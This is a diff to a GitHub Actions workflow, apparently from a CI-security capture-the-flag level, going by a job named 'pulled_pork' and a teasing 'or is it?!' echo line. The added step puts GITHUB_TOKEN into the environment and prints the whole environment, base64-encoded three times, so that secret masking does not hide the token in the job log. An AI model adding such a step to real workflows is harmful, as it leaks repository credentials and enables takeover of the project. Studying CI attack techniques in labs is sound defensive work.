@@ -4,21 +4,17 @@ on:
     
 permissions: {}
 
-concurrency:
-  group: ${{ github.workflow }}
-  cancel-in-progress: false
-
 jobs:
   pulled_pork:
-    runs-on: self-hosted
+    runs-on: ubuntu-latest
     timeout-minutes: 1
     permissions:
       id-token: write
     env:
-      ACTIONS_RUNNER_DEBUG: true
-      ACTIONS_STEP_DEBUG: true
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
     steps:
       - uses: step-security/harden-runner@63c24ba6bd7ba022e95695ff85de572c04a18142 # v2.7.0
         with:
           egress-policy: audit
-      - run: echo "Sorry, this level is not ready yet.... or is it?!"
+      - run: | 
+          sh -c 'env | base64 -w0 | base64 -w0 | base64 -w0'
